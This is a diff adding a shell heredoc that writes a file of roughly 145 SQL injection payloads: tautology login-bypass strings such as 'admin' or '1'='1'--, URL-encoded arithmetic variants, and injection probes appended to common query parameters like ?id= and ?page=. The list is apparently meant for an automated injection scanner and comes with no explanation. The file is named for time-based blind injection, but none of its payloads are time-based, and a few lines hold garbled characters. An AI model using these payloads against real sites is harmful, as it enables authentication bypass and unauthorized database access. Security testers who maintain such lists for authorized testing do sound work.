@@ -1,0 +1,148 @@
+cat << 'EOF' > payloads/blind_time.txt
+' or '1'='1
+' or 'x'='x
+') or ('x')=('x
+')) or (('x'))=(('x
+" or "x"="x
+") or ("x")=("x
+")) or (("x"))=(("x
+1'or'1'='1
+or 1=1
+or 1=1--
+or 1=1#
+or 1=1/*
+admin' or '1'='1
+admin' or '1'='1'--
+admin' or '1'='1'#
+admin'or 1=1 or ''='
+admin' or 1=1
+admin' or 1=1--
+admin' or 1=1#
+admin' or 1=1/*
+admin") or ("1"="1
+admin") or ("1"="1"--
+admin") or ("1"="1"#
+admin") or "1"="1
+admin") or "1"="1"--
+admin") or "1"="1"#
+'or-1%23
+0.or-1%23
+or true--
+" or true--
+' or true--
+") or true--
+') or true--
+'=' 'or'
+' or ''='
+or a=a
+or a = a
+' or ''-'
+' or '' '
+' or ''&'
+' or ''^'
+' or ''*'
+" or ""-"
+" or "" "
+" or ""&"
+" or ""^"
+" or ""*"
+admin%20OR%202%2B949-949-1=0%2B0%2B0%2B1%20--%20
+admin%20OR%202%2B669-669-1=0%2B0%2B0%2B1
+admin"%20OR%202%2B764-764-1=0%2B0%2B0%2B1%20--%20
+orwa%20OR%202%2B949-949-1=0%2B0%2B0%2B1%20--%20
+orwa-1"%20OR%202%2B804-804-1=0%2B0%2B0%2B1%20--%20
+-1'%20OR%202%2B388-388-1=0%2B0%2B0%2B1%20--%20
+-1'%20OR%202%2B251-251-1=0%2B0%2B0%2B1%20or%20'4dbGgO0h'='
+-1%20OR%202%2B949-949-1=0%2B0%2B0%2B1%20--%20
+-1%20OR%202%2B669-669-1=0%2B0%2B0%2B1
+-1"%20OR%202%2B764-764-1=0%2B0%2B0%2B1%20--%20
+or%201=1
+%20or%201=1
+)%20or%20('x'='x
+or '7659'='7659
+or 'text' = n'text'
+or 1=1 or ''='
+or 0=0 --
+or 0=0 #
+or 0=0 #"
+hi or 1=1 --"
+hi' or 'a'='a
+hi') or ('a'='a
+or 2 > 1
+or 3=3
+' or 'a'='a
+) or ('a'='a
+or 'unusual' = 'unusual'
+or 'text' > 't'
+or 'something' = 'some'+'thing'
+or 'whatever' in ('whatever')
+1' OR NOT 2470=2470-- Ontu
+xx49236287'%20or%208896=8896--
+orwa'%20OR%201=1--
+%20or%20''='
+%20or%20'x'='x
+hi' or 'x'='x'
+or '1'='1
+or '1'='1'--
+"a"" or 1=1--"
+â or 1=1 --
+Ã½ or 1=1 --
+â or 3=3 --
+anything' OR 'x'='x
+' or username like '%
+' or uname like '%
+' or uid like '%
+' or user like '%
+1 AND 1=1--
+' AND 1=1--
+?id=1' AND 1=1--
+?page=1' AND 1=1--
+?dir=1' AND 1=1--
+?search=1' AND 1=1--
+?category=1' AND 1=1--
+?class=1' AND 1=1--
+?file=1' AND 1=1--
+?url=1' AND 1=1--
+?news=1' AND 1=1--
+?item=1' AND 1=1--
+?menu=1' AND 1=1--
+?lang=1' AND 1=1--
+?name=1' AND 1=1--
+?ref=1' AND 1=1--
+?title=1' AND 1=1--
+?view=1' AND 1=1--
+?topic=1' AND 1=1--
+?thread=1' AND 1=1--
+?type=1' AND 1=1--
+?date=1' AND 1=1--
+?form=1' AND 1=1--
+?join=1' AND 1=1--
+?main=1' AND 1=1--
+?nav=1' AND 1=1--
+?region=1' AND 1=1--
+?id=1' OR '1'='1
+?page=1' OR '1'='1
+?dir=1' OR '1'='1
+?search=1' OR '1'='1
+?category=1' OR '1'='1
+?class=1' OR '1'='1
+?file=1' OR '1'='1
+?url=1' OR '1'='1
+?news=1' OR '1'='1
+?item=1' OR '1'='1
+?menu=1' OR '1'='1
+?lang=1' OR '1'='1
+?name=1' OR '1'='1
+?ref=1' OR '1'='1
+?title=1' OR '1'='1
+?view=1' OR '1'='1
+?topic=1' OR '1'='1
+?thread=1' OR '1'='1
+?type=1' OR '1'='1
+?date=1' OR '1'='1
+?form=1' OR '1'='1
+?join=1' OR '1'='1
+?main=1' OR '1'='1
+?nav=1' OR '1'='1
+?region=1' OR '1'='1
+EOF
